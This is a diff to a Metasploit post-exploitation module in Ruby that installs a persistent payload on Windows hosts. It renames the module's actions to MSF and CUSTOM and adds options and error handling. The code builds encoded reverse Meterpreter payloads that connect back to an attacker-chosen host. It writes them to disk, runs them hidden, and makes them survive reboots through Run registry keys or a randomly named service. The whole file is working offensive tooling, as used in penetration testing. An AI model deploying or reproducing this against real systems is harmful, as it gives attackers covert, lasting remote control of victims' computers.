@@ -25,13 +25,15 @@ class Metasploit3 < Msf::Post
 		super( update_info( info,
 			'Name'          => 'Windows Manage Persistent Payload Installer',
 			'Description'   => %q{
-				This Module will create a boot persistent reverse Meterpreter session by
-				installing on the target host the payload as a script that will be executed
-				at user logon or system startup depending on privilege and selected startup
-				method.
+				This module will install a payload that is executed during boot.
+				It works by installing a payload that will be executed at user logon or
+				system startup (depending on privilege and selected startup method).
 
-				REXE mode will transfer a binary of your choosing to remote host to be
-				used as a payload.
+				Using the MSF action will generate & transfer a reverse
+				Meterpreter payload.
+
+				Otherwise, the CUSTOM action will transfer a binary of your choosing
+				to the remote host to be used as the payload.
 			},
 			'License'       => MSF_LICENSE,
 			'Author'        =>
@@ -40,115 +42,174 @@ class Metasploit3 < Msf::Post
 					'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
 				],
 			'Platform'      => [ 'win' ],
-			'Actions'       => [['TEMPLATE'], ['REXE']],
-			'DefaultAction' => 'TEMPLATE',
+			'Actions'       =>
+				[
+					[	'MSF',
+						{
+							'Description' => 'Let Metasploit generate a Meterpeter payload.'
+						}
+					],
+					[	'CUSTOM',
+						{
+							'Description' => 'Use a custom binary file as the payload.'
+						}
+					]
+				],
+			'DefaultAction' => 'MSF',
 			'SessionTypes'  => [ 'meterpreter' ]
 		))
 
 		register_options(
 			[
-				OptAddress.new('LHOST', [true, 'IP for persistent payload to connect to.']),
-				OptInt.new('LPORT', [true, 'Port for persistent payload to connect to.']),
-				OptInt.new('DELAY', [true, 'Delay in seconds for persistent payload to reconnect.', 5]),
-				OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
-				OptBool.new('HANDLER', [ false, 'Start a Multi/Handler to Receive the session.', true]),
-				OptString.new('TEMPLATE', [false, 'Alternate template Windows PE File to use.']),
-				OptString.new('REXE',[false, 'The remote executable to use.','']),
-				OptString.new('REXENAME',[false, 'The name to call exe on remote system','']),
-				OptEnum.new('PAYLOAD_TYPE', [true, 'Meterpreter Payload Type.', 'TCP',['TCP','HTTP','HTTPS']])
+				OptBool.new('HANDLER', [true, 'Start a multi/handler to receive the session.', true]),
+				OptEnum.new('STARTUP', [true, 'Startup type for the payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
+				OptString.new('PATH', [true, 'PATH to write payload', '%TEMP%']),
+				OptBool.new('EXEC', [true, 'Execute the payload as soon as it\'s uploaded.', true]),
+				# ACTION=MSF
+				OptAddress.new('LHOST', [false, 'IP for Meterpeter payload to connect to.']),
+				OptInt.new('LPORT', [false, 'Port for Meterpeter payload to connect to.']),
+				# ACTION=CUSTOM
+				OptString.new('REXE', [false, 'Local path to the custom executable to use remotely.']),
+				OptString.new('REXENAME',[false, 'The filename of the custom executable to use on the remote host.'])
 			], self.class)
 
 		register_advanced_options(
 			[
-				OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.",""]),
-				OptString.new('ENCODER', [false, "Encoder name to use for encoding.",]),
-				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.']),
+				OptEnum.new('PAYLOAD_TYPE', [false, 'Meterpreter payload type.', 'TCP', ['TCP', 'HTTP', 'HTTPS']]),
+				OptInt.new('DELAY', [false, 'Delay (in seconds) at startup until Meterpreter tries to connect back.', 5]),
+				OptInt.new('ITERATIONS', [false, 'Number of iterations for encoding.', 5]),
+				OptString.new('ENCODER', [false, 'Encoder name to use for encoding.', 'x86/shikata_ga_nai']),
+				OptString.new('OPTIONS', [false, 'Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format.']),
+				OptString.new('TEMPLATE', [false, 'Alternate Windows PE file to use as a template for Meterpreter.'])
 			], self.class)
 	end
 
-	# Run Method for when run command is issued
+	# Run method for when run command is issued
 	#-------------------------------------------------------------------------------
 	def run
-		print_status("Running module against #{sysinfo['Computer']}")
-
 		# Set vars
-		rexe = datastore['REXE']
-		rexename = datastore['REXENAME']
+		action = datastore['ACTION'] || 'MSF'
+		delay = datastore['DELAY']
+		encoder = datastore['ENCODER']
+		exec = datastore['EXEC']
+		handler = datastore['HANDLER']
+		iterations = datastore['ITERATIONS']
 		lhost = datastore['LHOST']
 		lport = datastore['LPORT']
 		opts = datastore['OPTIONS']
-		delay = datastore['DELAY']
-		encoder = datastore['ENCODER']
-		iterations = datastore['ITERATIONS']
+		path = datastore['PATH'] || expand_path("%TEMP%")
+		payload_type = datastore['PAYLOAD_TYPE']
+		rexe = datastore['REXE']
+		rexename = datastore['REXENAME']
+		startup = datastore['STARTUP']
+		template = datastore['TEMPLATE']
 		@clean_up_rc = ""
-		host,port = session.session_host, session.session_port
 		payload = "windows/meterpreter/reverse_tcp"
+		begin
+			host, port = session.session_host, session.session_port
+		rescue => e
+			print_error("Couldn't connect to session")
+			return nil
+		end
 
-		if  datastore['ACTION'] == 'TEMPLATE'
-			# Check that if a template is provided that it actually exists
-			if datastore['TEMPLATE']
-				if not ::File.exists?(datastore['TEMPLATE'])
-					print_error "Template PE File does not exists!"
+		# Check user input
+		if action == 'MSF' or action == 'TEMPLATE'   # TEMPLATE - legacy
+			action = 'MSF'
+			print_status("Action: MSF (will generate a new payload for use)")
+
+			if lhost.nil? or lhost.empty?
+				print_error("Please set LHOST")
+				return
+			end
+
+			if not lport.between?(1, 65535)
+				print_error("Please set LPORT")
+				return
+			end
+
+			# Check to see if the template file actually exists
+			if template
+				if not ::File.exists?(template)
+					print_error "Template file doesn't exists"
 					return
-				else
-					template_pe = datastore['TEMPLATE']
 				end
 			end
 
-			# Set the proper payload
-			case datastore['PAYLOAD_TYPE']
-			when /TCP/i
-				payload = "windows/meterpreter/reverse_tcp"
-			when /HTTP/i
-				payload = "windows/meterpreter/reverse_http"
-			when /HTTPS/i
-				payload = "windows/meterpreter/reverse_https"
+			# Set the 'correct' payload
+			case payload_type
+				when /TCP/i
+					payload = "windows/meterpreter/reverse_tcp"
+				when /HTTP/i
+					payload = "windows/meterpreter/reverse_http"
+				when /HTTPS/i
+					payload = "windows/meterpreter/reverse_https"
+			end
+		elsif action == 'CUSTOM' or action == 'REXE'   # REXE - legacy
+			action = 'CUSTOM'
+			print_status("Action: CUSTOM (using a custom binary: #{rexe})")
+
+			if rexe.nil? or rexe.empty?
+				print_error("Please set REXE")
+				return
 			end
 
-			# Create payload and script
-			pay = create_payload(payload, lhost, lport, opts = "")
-			raw = pay_gen(pay,encoder, iterations)
-			script = create_script(delay, template_pe, raw)
-			script_on_target = write_script_to_target(script)
+			if not ::File.exist?(rexe)
+				print_error("REXE (#{rexe}) doesn't exist!")
+				return
+			end
+
+			if rexename.nil? or rexename.empty?
+				rexename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
+			end
+
+			if not rexename =~ /\.exe$/
+				rexename = "#{rexename}.exe"
+			end
 		else
-			if datastore['REXE'].nil? or datastore['REXE'].empty?
-				print_error("Please define REXE")
-				return
-			end
-
-			if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
-				print_error("Please define REXENAME")
-				return
-			end
-
-			if not ::File.exist?(datastore['REXE'])
-				print_error("Rexe file does not exist!")
-				return
-			end
-
-			raw = create_payload_from_file(rexe)
-			script_on_target = write_exe_to_target(raw,rexename)
+			print_error("Unknwon ACTION (#{action})")
+			return
 		end
 
+		# Start!
+		print_status("Running module against #{sysinfo['Computer']}")
+
+		# Create/load payload
+		if action == 'MSF'
+			pay = create_payload(payload, lhost, lport, opts = "")
+			raw = pay_gen(pay, encoder, iterations)
+			script = create_script(delay, template, raw)
+			script_on_target = write_to_target(script, path)
+		else
+			raw = create_payload_from_file(rexe)
+			script_on_target = write_to_target(raw, path, rexename)
+		end
+
+		if not script_on_target
+			print_error("Stopping...")
+			return
+		end
 
 		# Start handler if set
-		create_multihand(payload, lhost, lport) if datastore['HANDLER']
+		create_multihand(payload, lhost, lport) if handler
 
-		# Initial execution of script
-		target_exec(script_on_target)
-
-		case datastore['STARTUP']
-		when /USER/i
-			write_to_reg("HKCU",script_on_target)
-		when /SYSTEM/i
-			write_to_reg("HKLM",script_on_target)
-		when /SERVICE/i
-			install_as_service(script_on_target)
+		# Initial execution of payload (if set)
+		if exec
+			target_exec(script_on_target)
 		end
 
+		case startup
+			when /USER/i
+				write_to_reg("HKCU", script_on_target)
+			when /SYSTEM/i
+				write_to_reg("HKLM", script_on_target)
+			when /SERVICE/i
+				install_as_service(script_on_target)
+			end
+
+		# Generate clean up file
 		clean_rc = log_file()
 		file_local_write(clean_rc,@clean_up_rc)
-		print_status("Cleanup Meterpreter RC File: #{clean_rc}")
+		print_status("Cleanup Meterpreter RC file: #{clean_rc}")
 
 		report_note(:host => host,
 			:type => "host.persistance.cleanup",
@@ -160,14 +221,14 @@ class Metasploit3 < Msf::Post
 				:via_payload => session.via_payload,
 				:via_exploit => session.via_exploit,
 				:created_at => Time.now.utc,
-				:commands =>  @clean_up_rc
+				:commands => @clean_up_rc
 			}
 		)
 	end
 
 	# Generate raw payload
 	#-------------------------------------------------------------------------------
-	def pay_gen(pay,encoder, iterations)
+	def pay_gen(pay, encoder, iterations)
 		raw = pay.generate
 		if encoder
 			if enc_compat(pay, encoder)
@@ -200,7 +261,6 @@ class Metasploit3 < Msf::Post
 	# Create a payload given a name, lhost and lport, additional options
 	#-------------------------------------------------------------------------------
 	def create_payload(name, lhost, lport, opts = "")
-
 		pay = session.framework.payloads.create(name)
 		pay.datastore['LHOST'] = lhost
 		pay.datastore['LPORT'] = lport
@@ -216,15 +276,15 @@ class Metasploit3 < Msf::Post
 
 	end
 
-	# Function for Creating persistent script
+	# Function for creating payload
 	#-------------------------------------------------------------------------------
-	def create_script(delay,altexe,raw)
+	def create_script(delay, altexe, raw)
 		if not altexe.nil?
 			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay, :template => altexe})
 		else
 			vbs = ::Msf::Util::EXE.to_win32pe_vbs(session.framework, raw, {:persist => true, :delay => delay})
 		end
-		print_status("Persistent agent script is #{vbs.length} bytes long")
+		print_status("Payload is #{vbs.length} bytes long")
 		return vbs
 	end
 
@@ -234,7 +294,7 @@ class Metasploit3 < Msf::Post
 		#Get hostname
 		host = session.sys.config.sysinfo["Computer"]
 
-		# Create Filename info to be appended to downloaded files
+		# Create filename info to be appended to downloaded files
 		filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
 		# Create a directory for the logs
@@ -252,15 +312,15 @@ class Metasploit3 < Msf::Post
 		return logfile
 	end
 
-	# Function for writing script to target host
+	# Function for writing payload to target host
 	#-------------------------------------------------------------------------------
 	def write_script_to_target(vbs)
 		tempdir = session.fs.file.expand_path("%TEMP%")
-		tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
+		tempvbs = "#{tempdir}\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
 		fd = session.fs.file.new(tempvbs, "wb")
 		fd.write(vbs)
 		fd.close
-		print_good("Persistent Script written to #{tempvbs}")
+		print_good("Payload written to #{tempvbs}")
 		@clean_up_rc << "rm #{tempvbs}\n"
 		return tempvbs
 	end
@@ -268,7 +328,7 @@ class Metasploit3 < Msf::Post
 	# Method for checking if a listener for a given IP and port is present
 	# will return true if a conflict exists and false if none is found
 	#-------------------------------------------------------------------------------
-	def check_for_listner(lhost,lport)
+	def check_for_listner(lhost, lport)
 		conflict = false
 		client.framework.jobs.each do |k,j|
 			if j.name =~ / multi\/handler/
@@ -286,11 +346,10 @@ class Metasploit3 < Msf::Post
 
 	# Starts a multi/handler session
 	#-------------------------------------------------------------------------------
-	def create_multihand(payload,lhost,lport)
+	def create_multihand(payload, lhost, lport)
 		pay = session.framework.payloads.create(payload)
 		pay.datastore['LHOST'] = lhost
 		pay.datastore['LPORT'] = lport
-		print_status("Starting exploit multi handler")
 		if not check_for_listner(lhost,lport)
 			# Set options for module
 			mul = session.framework.exploits.create("multi/handler")
@@ -310,18 +369,19 @@ class Metasploit3 < Msf::Post
 				)
 		else
 			print_error("Could not start handler!")
-			print_error("A job is listening on the same Port")
+			print_error("A job is listening on the same port")
 		end
 	end
 
-	# Function to execute script on target and return the PID of the process
+	# Function to execute payload on target and return the PID of the process
 	#-------------------------------------------------------------------------------
 	def target_exec(script_on_target)
-		print_status("Executing script #{script_on_target}")
-		proc = datastore['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
-		: session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
+		print_status("Executing payload #{script_on_target}")
 
-		print_good("Agent executed with PID #{proc.pid}")
+		proc = action == 'MSF' ? session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true}) :\
+			session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
+		print_good("Payload executed with PID #{proc.pid}")
+
 		@clean_up_rc << "kill #{proc.pid}\n"
 		return proc.pid
 	end
@@ -335,41 +395,60 @@ class Metasploit3 < Msf::Post
 			registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
 			print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
 		else
-			print_error("Error: failed to open the registry key for writing")
+			print_error("Error: Failed to open the registry key for writing")
 		end
 	end
+
 	# Function to install payload as a service
 	#-------------------------------------------------------------------------------
 	def install_as_service(script_on_target)
-		if  is_system? or is_admin?
-			print_status("Installing as service..")
+		if is_system? or is_admin?
+			print_status("Installing as service")
 			nam = Rex::Text.rand_text_alpha(rand(8)+8)
 			print_status("Creating service #{nam}")
-			datastore['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
-
+			action == 'MSF' ? service_create(nam, nam, "cscript \"#{script_on_target}\"") : \
+				service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
+			print_good("Service successfully created")
 			@clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
 		else
 			print_error("Insufficient privileges to create service")
 		end
 	end
 
-
 	# Function for writing executable to target host
 	#-------------------------------------------------------------------------------
-	def write_exe_to_target(vbs,rexename)
-		tempdir = session.fs.file.expand_path("%TEMP%")
-		tempvbs = tempdir + "\\" + rexename
-		fd = session.fs.file.new(tempvbs, "wb")
-		fd.write(vbs)
-		fd.close
-		print_good("Persistent Script written to #{tempvbs}")
+	def write_to_target(vbs, path, rexename="")
+		tempdir = session.fs.file.expand_path(path)
+
+		if rexename
+			tempvbs = "#{tempdir}\\#{rexename}"
+		else
+			tempvbs = "#{tempdir}\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
+		end
+
+		if file? tempvbs
+			print_warning("File #{tempvbs} already exists... Removing...")
+			file_rm(tempvbs)
+		end
+
+		begin
+			fd = session.fs.file.new(tempvbs, "wb")
+			fd.write(vbs)
+			fd.close
+		rescue => e
+			print_error("Couldn't write to #{tempvbs}")
+			return nil
+		end
+
+		print_good("Payload written to #{tempvbs}")
 		@clean_up_rc << "rm #{tempvbs}\n"
 		return tempvbs
 	end
 
-	def create_payload_from_file(exec)
-		print_status("Reading Payload from file #{exec}")
-		return ::IO.read(exec)
+	# Function to read in custom binary
+	#-------------------------------------------------------------------------------
+	def create_payload_from_file(filein)
+		vprint_status("Using #{filein} as the payload")
+		return ::IO.read(filein)
 	end
-
 end
